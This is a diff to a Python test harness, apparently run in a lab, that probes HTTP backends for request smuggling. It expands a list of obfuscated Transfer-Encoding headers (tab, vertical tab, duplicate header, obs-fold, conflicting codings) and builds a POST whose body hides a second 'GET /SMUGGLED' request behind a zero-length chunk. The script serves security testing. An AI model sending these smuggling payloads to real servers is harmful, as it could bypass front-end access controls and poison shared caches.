@@ -38,15 +38,24 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parent))
 from backends import BACKENDS  # noqa: E402
 
-# The Transfer-Encoding values under test. The first is well-formed and is the
-# reference: a server that honors plain `chunked` is behaving correctly, and it is the
-# obfuscated rows that decide whether a lenient front end can be paired with it.
+# The framing header blocks under test. Each entry is the raw header line(s) inserted
+# after Content-Length, so a variant can express what a single value cannot: a duplicated
+# Transfer-Encoding, an obs-fold continuation, a second conflicting coding. The first
+# entry is well-formed and acts as the reference; a server honoring plain `chunked` is
+# behaving correctly, and the obfuscated rows decide whether a lenient front end can be
+# paired with it.
 VARIANTS = [
-    ("chunked", b"chunked"),
-    ("chunked<TAB>", b"chunked\t"),
-    ("chunked<SP>", b"chunked "),
-    ("chunked;a=b", b"chunked;a=b"),
-    ("chunked, identity", b"chunked, identity"),
+    ("chunked", b"Transfer-Encoding: chunked"),
+    ("chunked<TAB>", b"Transfer-Encoding: chunked\t"),
+    ("chunked<SP>", b"Transfer-Encoding: chunked "),
+    ("chunked<VT>", b"Transfer-Encoding: chunked\x0b"),
+    ("CHUNKED", b"Transfer-Encoding: CHUNKED"),
+    ("chunked;a=b", b"Transfer-Encoding: chunked;a=b"),
+    ("chunked, identity", b"Transfer-Encoding: chunked, identity"),
+    ("identity, chunked", b"Transfer-Encoding: identity, chunked"),
+    ("dup TE", b"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
+    ("TE obs-fold", b"Transfer-Encoding: chunked\r\n\tidentity"),
+    ("xchunked", b"Transfer-Encoding: xchunked"),
 ]
 
 SMUGGLED = b"GET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n"
@@ -79,14 +88,17 @@ def _send(port: int, payload: bytes, settle: float = 2.5):
     return out, None
 
 
-def probe(port: int, te: bytes):
-    """Fire one carrier whose body hides a second request behind a zero-length chunk."""
+def build(hdr: bytes) -> bytes:
+    """One carrier request whose body hides a second request behind a zero-length chunk."""
     body = b"0\r\n\r\n" + SMUGGLED
-    req = (
+    return (
         b"POST /carrier HTTP/1.1\r\nHost: lab\r\n"
-        b"Content-Length: %d\r\nTransfer-Encoding: %s\r\n\r\n" % (len(body), te)
+        b"Content-Length: %d\r\n%s\r\n\r\n" % (len(body), hdr)
     ) + body
-    return _send(port, req)
+
+
+def probe(port: int, hdr: bytes):
+    return _send(port, build(hdr))
 
 
 def control(port: int):
